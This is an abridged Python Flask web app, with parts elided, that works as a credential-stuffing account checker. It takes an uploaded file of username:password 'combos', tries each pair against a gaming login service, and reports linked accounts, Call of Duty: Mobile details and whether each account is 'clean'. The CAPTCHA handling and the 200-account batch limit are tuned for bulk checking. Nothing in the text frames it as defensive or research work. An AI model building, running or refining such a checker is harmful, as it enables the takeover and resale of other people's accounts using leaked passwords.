...
# NOTE: Reduced all request timeouts to 10 seconds to avoid Vercel timeouts.
...
def get_account_bindings(hider, coke):
    ...
    try:
        response = requests.get(init_url, headers=hider, cookies=coke, timeout=10) # Reduced timeout
...
def format_result_web(init_data, username, password):
    ...
    codm_info_section = f"""[ Call of Duty: Mobile ]
...
"""
    return f"""[ KENSHI KUPAL REPORT ]
Account Status: {init_data.get('is_clean', 'N/A')}
---------------------------------
...
def show_level(access_token, selected_header, sso, token, newdate, cookie):
    ...
    try:
        res = requests.get(url, headers=headers, cookies=cookie, params=params, timeout=10, allow_redirects=True) # Reduced timeout
    ...
    try:
        check_login_response = requests.get(check_login_url, headers=check_login_headers, timeout=10) # Reduced timeout
...
def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa):
    ...
    try:
        res = requests.get(url, headers=selected_header, cookies=cookies, timeout=10) # Reduced timeout
...
def check_account(username, password):
    try:
        ...
        response = requests.get(login_url, params=params, cookies=cookies, headers=headers, timeout=10) # Reduced timeout
        ...
        return "CRITICAL", f"An unexpected error occurred in check_account: {str(e)}"
...
def check_route():
    uploaded_file = request.files.get('combos_file')
    if not uploaded_file or uploaded_file.filename == '':
        flash("No file was uploaded. Please select a .txt file.", "error")
    ...
    try:
        combos_text = uploaded_file.stream.read().decode("utf-8")
        accounts_to_run = [acc.strip() for acc in combos_text.splitlines() if ':' in acc]
    except Exception as e:
        flash(f"Error reading file: {e}", "error")
        return redirect(url_for('index'))
    
    MAX_ACCOUNTS = 200 # Increased safety limit due to removal of threading
    limit_warning = ""
    ...
    # More stable sequential loop instead of threading
    for account_line in accounts_to_run:
        try:
            username, password = account_line.rsplit(':', 1)
            status, message = check_account(username, password)
            
            if status == "SUCCESS":
                success_results.append({'account': account_line, 'details': message})
            elif status == "CAPTCHA":
                failed_results.insert(0, {'account': account_line, 'reason': 'THIS ACCOUNT TRIGGERED A CAPTCHA BLOCK. Scan was halted.'})
                captcha_hit = True
                break # Stop the loop immediately
            else: # FAILED, CRITICAL
                failed_results.append({'account': account_line, 'reason': message})
        except Exception as e:
            # Catch errors if a line in the combo is malformed
            failed_results.append({'account': account_line, 'reason': f"CRITICAL ERROR processing this line: {e}"})
